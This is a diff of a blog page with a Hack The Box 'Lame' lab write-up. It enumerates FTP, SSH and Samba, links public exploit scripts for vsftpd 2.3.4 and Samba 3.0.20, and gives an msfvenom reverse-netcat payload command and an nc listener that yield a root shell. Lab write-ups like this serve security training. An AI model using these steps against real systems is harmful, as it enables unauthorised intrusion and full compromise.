@@ -7,9 +7,9 @@
     <link rel="stylesheet" href="/musubi/assets/css/style.css?v=">
     <script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.9"></script>
 
-<!-- Begin Jekyll SEO tag v2.6.1 -->
+<!-- Begin Jekyll SEO tag v2.8.0 -->
 <title>HTB{Lame} | Musubi</title>
-<meta name="generator" content="Jekyll v3.8.6" />
+<meta name="generator" content="Jekyll v4.2.2" />
 <meta property="og:title" content="HTB{Lame}" />
 <meta name="author" content="yunaranyancat" />
 <meta property="og:locale" content="en_US" />
@@ -20,8 +20,10 @@
 <meta property="og:site_name" content="Musubi" />
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2019-01-29T00:00:00+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HTB{Lame}" />
 <script type="application/ld+json">
-{"@type":"BlogPosting","author":{"@type":"Person","name":"yunaranyancat"},"url":"http://localhost:4000/musubi/notes/htb4oscp/linux/lame","headline":"HTB{Lame}","dateModified":"2019-01-29T00:00:00+08:00","datePublished":"2019-01-29T00:00:00+08:00","description":"Box introduction","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/musubi/notes/htb4oscp/linux/lame"},"@context":"https://schema.org"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"yunaranyancat"},"dateModified":"2019-01-29T00:00:00+08:00","datePublished":"2019-01-29T00:00:00+08:00","description":"Box introduction","headline":"HTB{Lame}","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/musubi/notes/htb4oscp/linux/lame"},"url":"http://localhost:4000/musubi/notes/htb4oscp/linux/lame"}</script>
 <!-- End Jekyll SEO tag -->
 
   </head>
@@ -77,37 +79,37 @@
 
 <p>So, there are 4 open ports which are;</p>
 
-<p><code class="highlighter-rouge">Ports:Service</code></p>
+<p><code class="language-plaintext highlighter-rouge">Ports:Service</code></p>
 
-<p><code class="highlighter-rouge"> 21:ftp </code></p>
+<p>` 21:ftp `</p>
 
-<p><code class="highlighter-rouge"> 22:ssh </code></p>
+<p>` 22:ssh `</p>
 
-<p><code class="highlighter-rouge"> 139:smb</code></p>
+<p>` 139:smb`</p>
 
-<p><code class="highlighter-rouge"> 445:smb</code></p>
+<p>` 445:smb`</p>
 
-<p>Based on the scan, we found other information too. So, first, we will start with <code class="highlighter-rouge">ftp</code> service.</p>
+<p>Based on the scan, we found other information too. So, first, we will start with <code class="language-plaintext highlighter-rouge">ftp</code> service.</p>
 
 <h3 id="enumerating-ftp">Enumerating FTP</h3>
 <p>Based on the scan, we have few information that might be useful;</p>
 
-<p>I. Version : <code class="highlighter-rouge">vsftpd 2.3.4</code> (is it the latest version, any vulnerability related to the version?)</p>
+<p>I. Version : <code class="language-plaintext highlighter-rouge">vsftpd 2.3.4</code> (is it the latest version, any vulnerability related to the version?)</p>
 
 <p>II. Anonymous login allowed (what’s inside the anonymous session? any important file? )</p>
 
 <h3 id="i-version">I. Version</h3>
 
 <p>so first, we will look at the version. We will check if there is any exploit related to the particular version in the exploitdb, so start by typing
-<code class="highlighter-rouge">searchsploit vsftpd 2.3.4</code></p>
+<code class="language-plaintext highlighter-rouge">searchsploit vsftpd 2.3.4</code></p>
 
 <p><img src="/musubi/assets/htboscp/linux/lame/searchsploit.png" alt="searchsploit" /></p>
 
-<p>and we found out that there is <code class="highlighter-rouge">Backdoor Command Execution</code> exploit available. Let’s take a look at the exploit, below is only the part of the full exploit;</p>
+<p>and we found out that there is <code class="language-plaintext highlighter-rouge">Backdoor Command Execution</code> exploit available. Let’s take a look at the exploit, below is only the part of the full exploit;</p>
 
 <p><img src="/musubi/assets/htboscp/linux/lame/exploit.png" alt="snippet" /></p>
 
-<p>as we can see, the exploit is part of <code class="highlighter-rouge">Metasploit Framework</code>. So, we can start <code class="highlighter-rouge">msf</code> and run the exploit or we can exploit it without using <code class="highlighter-rouge">metasploit</code> . For now, let’s do it without <code class="highlighter-rouge">metasploit</code></p>
+<p>as we can see, the exploit is part of <code class="language-plaintext highlighter-rouge">Metasploit Framework</code>. So, we can start <code class="language-plaintext highlighter-rouge">msf</code> and run the exploit or we can exploit it without using <code class="language-plaintext highlighter-rouge">metasploit</code> . For now, let’s do it without <code class="language-plaintext highlighter-rouge">metasploit</code></p>
 
 <p>So, I found a python version at this github <a href="https://raw.githubusercontent.com/In2econd/vsftpd-2.3.4-exploit/master/vsftpd_234_exploit.py">repo</a>, but when we try to run it, we will find that the attack failed.</p>
 
@@ -123,24 +125,24 @@
 
 <h3 id="enumerating-ssh">Enumerating SSH</h3>
 
-<p>Since there is no credentials found and the version <code class="highlighter-rouge">OpenSSH 4.7p1</code> has no known vulnerability, we will move on to the next service.</p>
+<p>Since there is no credentials found and the version <code class="language-plaintext highlighter-rouge">OpenSSH 4.7p1</code> has no known vulnerability, we will move on to the next service.</p>
 
 <h3 id="enumerating-smb">Enumerating SMB</h3>
 
-<p>Since there are two ports open, we will first look at the version that has been scanned by our <code class="highlighter-rouge">nmap</code>.</p>
+<p>Since there are two ports open, we will first look at the version that has been scanned by our <code class="language-plaintext highlighter-rouge">nmap</code>.</p>
 
-<p><code class="highlighter-rouge">Port:Service:Version</code></p>
+<p><code class="language-plaintext highlighter-rouge">Port:Service:Version</code></p>
 
-<p><code class="highlighter-rouge"> 139:SMB:Samba smbd 3.X - 4.X </code></p>
+<p>` 139:SMB:Samba smbd 3.X - 4.X `</p>
 
-<p><code class="highlighter-rouge"> 445:SMB:Samba smbd 3.0.20-Debian</code></p>
+<p>` 445:SMB:Samba smbd 3.0.20-Debian`</p>
 
 <h3 id="version-vulnerabilities">Version vulnerabilities</h3>
-<p>Since port 139 does not show the exact version of samba, so we will ignore it for now and go to port 445, which is <code class="highlighter-rouge">smbd 3.0.20</code>. Using <code class="highlighter-rouge">searchsploit</code>, we will come across two vulnerabilities.</p>
+<p>Since port 139 does not show the exact version of samba, so we will ignore it for now and go to port 445, which is <code class="language-plaintext highlighter-rouge">smbd 3.0.20</code>. Using <code class="language-plaintext highlighter-rouge">searchsploit</code>, we will come across two vulnerabilities.</p>
 
 <p><img src="/musubi/assets/htboscp/linux/lame/searchsploitsamba.png" alt="vuln" /></p>
 
-<p>So, by reading the first exploit, we know it is part of the <code class="highlighter-rouge">metasploit</code> modules too. Luckily, I found a python version in this <a href="https://gist.githubusercontent.com/joenorton8014/5aeffe8220e790f3356fbbd6b508efbc/raw/06712ff5afca5ee7f5dcfdd7dafc67d4688452d5/samba-usermap-bind.py">repo</a>.</p>
+<p>So, by reading the first exploit, we know it is part of the <code class="language-plaintext highlighter-rouge">metasploit</code> modules too. Luckily, I found a python version in this <a href="https://gist.githubusercontent.com/joenorton8014/5aeffe8220e790f3356fbbd6b508efbc/raw/06712ff5afca5ee7f5dcfdd7dafc67d4688452d5/samba-usermap-bind.py">repo</a>.</p>
 
 <p>So, let’s take a look at the exploit code;</p>
 
@@ -149,33 +151,33 @@
 <p>As we can see, the code is really simple to understand and to edit.
 The first thing we want to do is, we need to change the current shellcode into our shellcode instead;</p>
 
-<p>To generate our shellcode using <code class="highlighter-rouge">msfvenom</code>, simply type :</p>
+<p>To generate our shellcode using <code class="language-plaintext highlighter-rouge">msfvenom</code>, simply type :</p>
 
-<p><code class="highlighter-rouge"> msfvenom -p cmd/unix/reverse_netcat LHOST=[Kali IP] LPORT=[Kali Port] -f python</code></p>
+<p>` msfvenom -p cmd/unix/reverse_netcat LHOST=[Kali IP] LPORT=[Kali Port] -f python`</p>
 
-<p>which tells <code class="highlighter-rouge">msfvenom</code> to create our shellcode and output it in python format.</p>
+<p>which tells <code class="language-plaintext highlighter-rouge">msfvenom</code> to create our shellcode and output it in python format.</p>
 
 <p><img src="/musubi/assets/htboscp/linux/lame/payload.png" alt="payload" /></p>
 
-<p>Then replace the available shellcode in the exploit with our new generated one. (under <code class="highlighter-rouge">shellcode</code>)</p>
+<p>Then replace the available shellcode in the exploit with our new generated one. (under <code class="language-plaintext highlighter-rouge">shellcode</code>)</p>
 
 <h2 id="exploitation">Exploitation</h2>
 
 <p>Then , set up our listener based on the IP that we have set for our shellcode. Type,</p>
 
-<p><code class="highlighter-rouge">nc -lvnp [Kali Port]</code></p>
+<p><code class="language-plaintext highlighter-rouge">nc -lvnp [Kali Port]</code></p>
 
 <p>then , execute our exploit.</p>
 
 <p><img src="/musubi/assets/htboscp/linux/lame/executed.png" alt="executed" /></p>
 
-<p>and boom!! we got a connection to our <code class="highlighter-rouge">netcat</code> listener. :3</p>
+<p>and boom!! we got a connection to our <code class="language-plaintext highlighter-rouge">netcat</code> listener. :3</p>
 
 <p><img src="/musubi/assets/htboscp/linux/lame/connection.png" alt="connection" /></p>
 
 <h2 id="post-exploitation">Post exploitation</h2>
 
-<p>This exploit will give us directly a <code class="highlighter-rouge">root</code> access. We can confirm it by running <code class="highlighter-rouge">whoami</code> .</p>
+<p>This exploit will give us directly a <code class="language-plaintext highlighter-rouge">root</code> access. We can confirm it by running <code class="language-plaintext highlighter-rouge">whoami</code> .</p>
 
 <p><img src="/musubi/assets/htboscp/linux/lame/root.png" alt="whoami" /></p>
 
@@ -204,7 +206,7 @@ The first thing we want to do is, we need to change the current shellcode into o
   </body>
 
   <footer>
-    <small>&copy; 2020 yunaranyancat </small>
+    <small>&copy; 2022 yunaranyancat </small>
   </footer>
 
 </html>
@@ -230,4 +232,6 @@ var typed = new Typed('#typed', {
 });
 </script>
 
+<!-- 
 <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="yunaranyancat" data-description="Thank you so much for your support! (◕‿◕)" data-message="Thank you for visiting! ＼(≧▽≦)／" data-color="#FF5F5F" data-position="right" data-x_margin="18" data-y_margin="18"></script>
+-->
